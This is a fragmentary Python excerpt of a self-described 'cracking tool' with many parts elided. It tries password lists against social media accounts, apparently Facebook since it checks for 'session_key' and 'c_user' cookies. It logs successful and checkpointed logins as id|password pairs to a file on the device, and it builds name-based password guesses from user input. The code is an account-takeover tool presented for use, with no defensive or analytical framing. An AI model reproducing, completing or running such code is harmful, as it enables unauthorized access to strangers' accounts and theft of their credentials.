...
while key == 'true':
    ...
    if username == correct_username:
        print('\3[1;37m──────────────────\3[0;97m[•]\3[1;32m WELCOME TO CRACKING TOOL ')
        time.sleep(1)
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [SHIKI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SHIKI.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Shin, Jonell, Micheal ')
                code = input(' First name : ')
                print(' Name Example : Torres, Ocampo, Machina')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[SHIKI-CP] '+idf+' | '+ps+'\033[0;97m')
